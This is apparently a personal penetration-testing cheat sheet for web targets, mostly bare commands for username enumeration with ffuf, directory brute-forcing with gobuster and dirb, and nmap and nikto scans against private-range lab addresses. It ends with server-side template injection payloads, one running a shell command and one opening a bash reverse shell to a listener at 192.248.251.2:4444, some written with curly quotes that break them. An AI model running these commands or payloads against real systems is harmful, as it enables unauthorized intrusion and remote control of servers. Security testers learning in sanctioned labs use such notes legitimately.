---
  title: "HTTP"
---
# Methodology

- identify http port
- identify services version
- identify stack (wordpress, joumla etc.)
- identify directories
- identify subdomains
- Look for common vulnerabilities and fileis
-

# Service discovery
# Framework discovery
# Common vulnerabilities discovery
# Directory discovery
# Subdomain discovery
# Username discovery
#### ffuf
- w wordlist file Path
- X method
- H extra headers
- u the url
- mr specifies the text on the page that we are looking to validate that we have a valid username
`ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.93.83/customers/signup -mr "username already exists"`

# HTTPS

nikto -host

Port and service scanning
nmap -sV --script=http-enum 192.168.120.62

curl -v http://192.168.120.62:8000


FUZZING
ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://147.102.33.187/FUZZ"
gobuster dir --url 10.129.227.155 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
gobuster dir -u http://10.10.11.100/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 30 -x php

dirb http://192.168.120.62:8000

amqtt
nmap -sV -Pn -n -T4 -p 5672 --script amqp-info <IP>


Check if web app is vulnerable to Server-Side Template Injection
URL: 192.248.251.3:8000/{{7*’7'}}
SSTI Payload: {{config.__class__.__init__.__globals__[‘os’].popen(‘ls’).read()}}
SSTI Payload: {{config.__class__.__init__.__globals__[‘os’].popen(“bash -c ‘bash -i >& /dev/tcp/192.248.251.2/4444 0>&1’”).read()}}

xsser tool
